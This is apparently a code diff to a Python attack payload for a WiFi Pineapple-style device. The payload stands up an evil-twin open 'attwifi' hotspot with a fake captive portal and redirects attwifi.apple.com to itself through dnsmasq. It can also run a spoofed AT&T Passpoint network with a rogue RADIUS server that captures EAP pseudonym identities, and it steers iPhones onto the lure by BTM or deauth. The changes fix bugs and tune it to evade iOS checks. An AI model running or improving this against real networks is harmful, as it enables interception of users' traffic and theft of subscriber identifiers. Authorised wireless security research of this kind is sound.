@@ -117,9 +117,20 @@ LOG_DIR = "/mmc/root/loot/att-open-steer"
 WIRELESS_BAK  = "/tmp/att-open-steer-wireless.bak"
 DNSMASQ_BAK   = "/tmp/att-open-steer-dnsmasq.conf.bak"
 RADIO_MAC_BAK = "/tmp/att-open-steer-radio-mac.bak"
+PINEAP_BAK    = "/tmp/att-open-steer-pineapd.bak"
 
 WISPR_PORT    = 80
 RADIUS_SECRET = "testing123"
+
+# The AT&T `attwifi` managed-open profile validates connectivity against this
+# carrier-specific host over HTTP. We redirect ONLY this name to the Pager.
+# Do NOT redirect `captive.apple.com`: iOS also probes it over HTTPS (443),
+# and pointing it at the Pager (which has no TLS listener) yields a refused
+# connection that makes iOS mark the whole network captive.
+DNSMASQ_UCI   = "dhcp.@dnsmasq[0]"
+DNSMASQ_PROBE = "attwifi.apple.com"
+DNSMASQ_CONF  = "/etc/dnsmasq.conf"
+DNSMASQ_MARK  = "# att-open-steer captive"
 
 
 # ---------------------------------------------------------------------------
@@ -169,6 +180,28 @@ def wifi_reload():
 def stop_pineapd():
     shell_out("killall -TERM pineapd 2>/dev/null; sleep 0.5; "
               "killall -KILL pineapd 2>/dev/null; true")
+
+
+def kill_matching(pattern, log_fp=None):
+    """Kill every process whose full cmdline matches `pattern`.
+
+    The Pager's BusyBox has NO `pkill` ("applet not found"), so the original
+    `pkill -f ...` cleanup silently did nothing: stale radius/wispr/dhcp
+    processes stacked up, and a stale WISPr holding :80 made the next WISPr
+    fail to bind, which made the whole payload exit. Use `pgrep -f` + `kill`.
+    The pattern is written with a `[.]` so it cannot match the shell running
+    pgrep itself.
+    """
+    pids = shell_out(f"pgrep -f '{pattern}' 2>/dev/null").split()
+    me = os.getpid()
+    killed = []
+    for pid in pids:
+        if pid.isdigit() and int(pid) != me:
+            subprocess.run(f"kill -9 {pid} 2>/dev/null", shell=True, check=False)
+            killed.append(pid)
+    if log_fp and killed:
+        log(f"[kill] {pattern} -> {killed}", log_fp)
+    return killed
 
 
 def start_pineapd():
@@ -257,10 +290,14 @@ def configure_open_bss(log_fp):
     uci_set("wireless.wlan0open.skip_inactivity_poll", "1")
     uci_set("wireless.wlan0open.disassoc_low_ack", "0")
     uci_set("wireless.wlan0open.max_inactivity", "86400")
-    # 802.11k/v capability (needed if we steer TO this BSS)
-    uci_set("wireless.wlan0open.ieee80211k", "1")
-    uci_set("wireless.wlan0open.bss_transition", "1")
-    uci_set("wireless.wlan0open.rrm_neighbor_report", "1")
+    # The 802.11k/v options (ieee80211k/bss_transition/rrm_neighbor_report) are
+    # compiled only into wpad-wolfssl. On the factory wpad they make hostapd
+    # reject the whole BSS ("unknown configuration item 'bss_transition'" ->
+    # "hostapd.add_iface failed"), so the open attwifi AP never beacons and the
+    # phone cannot associate. They are not needed on the open BSS (steering,
+    # when used, targets the enterprise BSS), so drop them.
+    for k in ("ieee80211k", "bss_transition", "rrm_neighbor_report"):
+        uci_del(f"wireless.wlan0open.{k}")
     uci_commit()
     log(f"[open] {AP_OPEN} = open {SSID_OPEN!r}", log_fp)
 
@@ -313,42 +350,95 @@ def configure_ent_bss(log_fp):
     log(f"[ent] {AP_ENT} = Passpoint {SSID_ENT!r}", log_fp)
 
 
+def _dnsmasq_conf_strip():
+    """Remove any lines we previously added to /etc/dnsmasq.conf."""
+    if not os.path.exists(DNSMASQ_CONF):
+        return
+    with open(DNSMASQ_CONF) as f:
+        lines = f.readlines()
+    keep = [l for l in lines
+            if DNSMASQ_MARK not in l and DNSMASQ_PROBE not in l]
+    with open(DNSMASQ_CONF, "w") as f:
+        f.writelines(keep)
+
+
 def install_dnsmasq_captive(server_ip, log_fp):
-    backup_file("/etc/dnsmasq.conf", DNSMASQ_BAK)
-    existing = ""
-    if os.path.exists("/etc/dnsmasq.conf"):
-        with open("/etc/dnsmasq.conf") as f:
-            existing = f.read()
-    # Strip any prior captive override (possibly pointing at a stale IP from a
-    # previous isolate/non-isolate run) before adding the current one.
-    keep = [l for l in existing.splitlines()
-            if "captive.apple.com" not in l and "att-open-steer captive" not in l]
-    line = f"address=/captive.apple.com/{server_ip}"
-    keep.append("")
-    keep.append("# att-open-steer captive override")
-    keep.append(line)
-    with open("/etc/dnsmasq.conf", "w") as f:
-        f.write("\n".join(keep) + "\n")
-    shell_out("kill -HUP $(pidof dnsmasq) 2>/dev/null; true")
-    log(f"[dnsmasq] captive.apple.com -> {server_ip}", log_fp)
+    """Redirect the iPhone's AT&T captive-probe host to the Pager.
+
+    Must use the ACTIVE dnsmasq config: the running dnsmasq is started with
+    `-C /var/etc/dnsmasq.conf.cfg*`, so editing /etc/dnsmasq.conf alone and
+    HUP'ing was a no-op. We (1) set the UCI `address` list, which the OpenWrt
+    init script renders as `address=/host/ip`, and (2) append a raw `local=`
+    line to /etc/dnsmasq.conf (which the generated config `conf-file`s) so
+    dnsmasq is authoritative for the name and the real SVCB/HTTPS (type 65)
+    record cannot leak a real Apple IP that iOS would then connect to.
+
+    `captive.apple.com` is deliberately NOT touched -- iOS probes it over
+    HTTPS too, and hijacking it to a host with no 443 listener makes iOS treat
+    the network as captive.
+    """
+    for v in shell_out(f"uci -q get {DNSMASQ_UCI}.address 2>/dev/null").split():
+        if DNSMASQ_PROBE in v:
+            subprocess.run(f"uci -q del_list {DNSMASQ_UCI}.address='{v}'",
+                           shell=True, check=False)
+    subprocess.run(
+        f"uci add_list {DNSMASQ_UCI}.address='/{DNSMASQ_PROBE}/{server_ip}'",
+        shell=True, check=False)
+    uci_commit("dhcp")
+
+    _dnsmasq_conf_strip()
+    with open(DNSMASQ_CONF, "a") as f:
+        f.write(f"\n{DNSMASQ_MARK}\nlocal=/{DNSMASQ_PROBE}/\n")
+
+    shell_out("/etc/init.d/dnsmasq restart >/dev/null 2>&1; true")
+    log(f"[dnsmasq] {DNSMASQ_PROBE} -> {server_ip} (active config + local)", log_fp)
 
 
 def remove_dnsmasq_captive(log_fp):
-    if os.path.exists(DNSMASQ_BAK):
-        subprocess.run(["cp", DNSMASQ_BAK, "/etc/dnsmasq.conf"], check=False)
-        os.remove(DNSMASQ_BAK)
-    else:
-        # strip any stale override lines we may have added in prior runs
-        if os.path.exists("/etc/dnsmasq.conf"):
-            with open("/etc/dnsmasq.conf") as f:
-                lines = f.readlines()
-            keep = [l for l in lines
-                    if "captive.apple.com" not in l
-                    and "att-open-steer captive" not in l]
-            with open("/etc/dnsmasq.conf", "w") as f:
-                f.writelines(keep)
-    shell_out("kill -HUP $(pidof dnsmasq) 2>/dev/null; true")
+    for v in shell_out(f"uci -q get {DNSMASQ_UCI}.address 2>/dev/null").split():
+        if DNSMASQ_PROBE in v:
+            subprocess.run(f"uci -q del_list {DNSMASQ_UCI}.address='{v}'",
+                           shell=True, check=False)
+    uci_commit("dhcp")
+    _dnsmasq_conf_strip()
+    shell_out("/etc/init.d/dnsmasq restart >/dev/null 2>&1; true")
     log("[dnsmasq] captive override removed", log_fp)
+
+
+# ---------------------------------------------------------------------------
+# PineAP: stop it beaconing competing SSIDs (notably `attwifi`)
+# ---------------------------------------------------------------------------
+def disable_pineap(log_fp):
+    """Stop PineAP from broadcasting competing SSIDs while the lure is up.
+
+    PineAP's SSID pool auto-populates (autossidpool=1) and by the time we run
+    it contains `attwifi` and `AT&T Secure Wi-Fi` from recon. With the engine
+    enabled PineAP injects those as extra BSSIDs (wlan1mon, 2.4+5 GHz), so iOS
+    sees multiple `attwifi` BSSIDs, roams onto a fake with no captive server,
+    and marks the network bad (disabling auto-join). We disable the engine and
+    the injection interfaces for the duration; restored on cleanup.
+    """
+    backup_file("/etc/config/pineapd", PINEAP_BAK)
+    for key, val in (
+        ("pineapd.@hostapd[0].pineap_disabled", "1"),
+        ("pineapd.@hostapd[0].pineape_disabled", "1"),
+        ("pineapd.@pineapd[0].autossidpool", "0"),
+        ("pineapd.wlan0mon.disable", "1"),
+        ("pineapd.wlan1mon.disable", "1"),
+        ("pineapd.wlan2mon.disable", "1"),
+    ):
+        uci_set(key, val)
+    uci_commit("pineapd")
+    shell_out("/etc/init.d/pineapd restart >/dev/null 2>&1; true")
+    log("[pineap] engine/injection disabled (no competing attwifi beacons)", log_fp)
+
+
+def restore_pineap(log_fp):
+    if os.path.exists(PINEAP_BAK):
+        subprocess.run(["cp", PINEAP_BAK, "/etc/config/pineapd"], check=False)
+        os.remove(PINEAP_BAK)
+        shell_out("/etc/init.d/pineapd restart >/dev/null 2>&1; true")
+        log("[pineap] config restored", log_fp)
 
 
 # ---------------------------------------------------------------------------
@@ -641,9 +731,14 @@ def run(args, log_fp):
     assert_safe_shell()
     # capture the uplink's current address BEFORE we touch the radio
     snapshot_uplink(log_fp)
-    if not wpad_swap("wolfssl", log_fp):
-        log("[FATAL] wpad-wolfssl unavailable", log_fp)
-        return 1
+    # The Passpoint lure (Hotspot2.0/Interworking IEs + the 802.11k/v control
+    # commands) needs wpad-wolfssl. The open-only path works on the factory
+    # wpad, so skip the swap entirely to avoid the extra radio churn that
+    # knocks wlan0cli off.
+    if args.enterprise:
+        if not wpad_swap("wolfssl", log_fp):
+            log("[FATAL] wpad-wolfssl unavailable", log_fp)
+            return 1
 
     backup_file("/etc/config/wireless", WIRELESS_BAK)
     if os.path.exists("/sys/class/ieee80211/phy0/macaddress"):
@@ -652,16 +747,20 @@ def run(args, log_fp):
     # bring the radio base back to the factory universal MAC first
     shell_out(f"echo {RADIO_BASE} > /sys/class/ieee80211/phy0/macaddress")
 
+    # PineAP must not beacon competing `attwifi` BSSIDs while the lure is up.
+    disable_pineap(log_fp)
+
     set_radio_macs(log_fp)
     configure_open_bss(log_fp)
-    configure_ent_bss(log_fp)
+    if args.enterprise:
+        configure_ent_bss(log_fp)
     stop_pineapd()
     wifi_reload()
 
     if not verify_bss_up(AP_OPEN, timeout=90):
         log("[FATAL] open attwifi BSS did not come up", log_fp)
         return 1
-    if not verify_bss_up(AP_ENT, timeout=90):
+    if args.enterprise and not verify_bss_up(AP_ENT, timeout=90):
         log("[WARN] enterprise (Passpoint) BSS did not come up", log_fp)
     time.sleep(2)
     if CHANNEL:
@@ -672,13 +771,15 @@ def run(args, log_fp):
     # reassociate so the phone gets real internet (otherwise iOS drops us).
     restore_uplink(log_fp)
 
-    # Ensure neither BSS deauths an idle client (the iPhone sits idle in the
+    # Ensure the AP never deauths an idle client (the iPhone sits idle in the
     # captive-portal flow and would otherwise be dropped ~10s in).
     inject_hold_station(AP_OPEN, log_fp)
-    inject_hold_station(AP_ENT, log_fp)
+    if args.enterprise:
+        inject_hold_station(AP_ENT, log_fp)
 
     log(f"[bss] {SSID_OPEN!r:22} {AP_OPEN} bssid={bss_bssid(AP_OPEN)}", log_fp)
-    log(f"[bss] {SSID_ENT!r:22} {AP_ENT} bssid={bss_bssid(AP_ENT)}", log_fp)
+    if args.enterprise:
+        log(f"[bss] {SSID_ENT!r:22} {AP_ENT} bssid={bss_bssid(AP_ENT)}", log_fp)
 
     # captive portal / DHCP for the open twin.
     #
@@ -716,29 +817,38 @@ def run(args, log_fp):
     shell_out("killall -HUP hostapd 2>/dev/null; true")
     time.sleep(1)
 
-    # RADIUS on the enterprise BSS -> pseudonym capture + stall
-    radius_log = os.path.join(args.run_dir, "radius.log")
-    radius = subprocess.Popen(
-        ["python3", RADIUS_SCRIPT, "--bind", "127.0.0.1", "--port", "1812",
-         "--secret", RADIUS_SECRET, "--mode", args.radius_mode,
-         "--log", radius_log],
-        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    log(f"[radius] PID={radius.pid} mode={args.radius_mode}", log_fp)
+    # RADIUS on the enterprise BSS -> pseudonym capture + stall (only when the
+    # Passpoint lure is enabled).
+    radius = None
+    if args.enterprise:
+        radius_log = os.path.join(args.run_dir, "radius.log")
+        radius = subprocess.Popen(
+            ["python3", RADIUS_SCRIPT, "--bind", "127.0.0.1", "--port", "1812",
+             "--secret", RADIUS_SECRET, "--mode", args.radius_mode,
+             "--log", radius_log],
+            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        log(f"[radius] PID={radius.pid} mode={args.radius_mode}", log_fp)
 
     # WISPr portal on the open twin
-    wispr = subprocess.Popen(
-        ["python3", WISPR_SCRIPT, "--port", str(WISPR_PORT),
-         "--log", os.path.join(args.run_dir, "wispr.log"),
-         "--server-ip", server_ip, "--wispr-mode", "apple-success"],
-        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    log(f"[wispr] PID={wispr.pid}", log_fp)
+    args.server_ip = server_ip
+    wispr = start_wispr(args, server_ip, log_fp)
 
     loop(args, log_fp, radius, wispr)
     return 0
 
 
+def start_wispr(args, server_ip, log_fp):
+    w = subprocess.Popen(
+        ["python3", WISPR_SCRIPT, "--port", str(WISPR_PORT),
+         "--log", os.path.join(args.run_dir, "wispr.log"),
+         "--server-ip", server_ip, "--wispr-mode", "apple-success"],
+        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    log(f"[wispr] PID={w.pid}", log_fp)
+    return w
+
+
 def loop(args, log_fp, radius, wispr):
-    log("[loop] waiting for iPhone (open attwifi + AT&T Secure Wi-Fi both up)", log_fp)
+    log("[loop] waiting for iPhone", log_fp)
     seen_users = []
     steered = {}
     landed = set()
@@ -758,8 +868,9 @@ def loop(args, log_fp, radius, wispr):
                 log(f"[pseudonym] CAPTURED outer-id: {u!r}{flag}", log_fp)
                 shell_out(f"LOG green 'pseudonym: {u}' 2>/dev/null")
 
-        # steering (optional)
-        if args.steer_mode != "off" and (now - last_steer) >= args.steer_interval:
+        # steering (optional; only meaningful with the Passpoint lure up)
+        if (args.enterprise and args.steer_mode != "off"
+                and (now - last_steer) >= args.steer_interval):
             for mac in stations(AP_ENT):
                 n = steered.get(mac, 0)
                 if n >= args.max_steer_attempts:
@@ -797,12 +908,12 @@ def loop(args, log_fp, radius, wispr):
                 f"landed={len(landed)} pseudonyms={len(seen_users)} "
                 f"uplink={uplink_iface()}", log_fp)
 
-        if radius.poll() is not None:
+        if radius is not None and radius.poll() is not None:
             log("[loop] radius exited; stopping", log_fp)
             break
         if wispr.poll() is not None:
-            log("[loop] wispr exited; stopping", log_fp)
-            break
+            log("[loop] wispr exited; restarting", log_fp)
+            wispr = start_wispr(args, args.server_ip, log_fp)
 
 
 # ---------------------------------------------------------------------------
@@ -817,13 +928,9 @@ def cleanup(args, log_fp):
     _cleanup_done[0] = True
     log("[cleanup] starting", log_fp)
 
-    shell_out("pkill -TERM -f radius-reject.py 2>/dev/null; "
-              "pkill -TERM -f v28_dhcpd.py 2>/dev/null; "
-              "pkill -TERM -f v28_wispr.py 2>/dev/null; true")
+    for pat in ("radius-reject[.]py", "v28_dhcpd[.]py", "v28_wispr[.]py"):
+        kill_matching(pat, log_fp)
     time.sleep(1)
-    shell_out("pkill -KILL -f radius-reject.py 2>/dev/null; "
-              "pkill -KILL -f v28_dhcpd.py 2>/dev/null; "
-              "pkill -KILL -f v28_wispr.py 2>/dev/null; true")
 
     remove_dnsmasq_captive(log_fp)
     shell_out(f"{ISOLATE_SCRIPT} down", check=False)
@@ -846,6 +953,7 @@ def cleanup(args, log_fp):
     shell_out("/etc/init.d/firewall reload >/dev/null 2>&1; true")
     wifi_reload()
     wpad_swap("stock", log_fp)
+    restore_pineap(log_fp)
     start_pineapd()
     log("[cleanup] done", log_fp)
 
@@ -857,6 +965,11 @@ def main():
                         "default is no-isolate (phone on br-lan with the Pager's "
                         "dnsmasq)")
     p.add_argument("--no-isolate", dest="isolate", action="store_false")
+    p.add_argument("--no-enterprise", dest="enterprise", action="store_false",
+                   default=True,
+                   help="open-only: skip the Passpoint enterprise lure (no "
+                        "pseudonym capture; single open attwifi BSS on the "
+                        "factory wpad, no steering)")
     p.add_argument("--steer-mode", default="btm",
                    choices=["btm", "deauth", "both", "off"])
     p.add_argument("--steer-always", action="store_true")
@@ -875,7 +988,8 @@ def main():
     os.makedirs(args.run_dir, exist_ok=True)
     log_fp = open(os.path.join(args.run_dir, "run.log"), "a", buffering=1)
     log(f"att-open-steer starting isolate={args.isolate} "
-        f"steer-mode={args.steer_mode} radius-mode={args.radius_mode}", log_fp)
+        f"enterprise={args.enterprise} steer-mode={args.steer_mode} "
+        f"radius-mode={args.radius_mode}", log_fp)
 
     if not args.force:
         try:
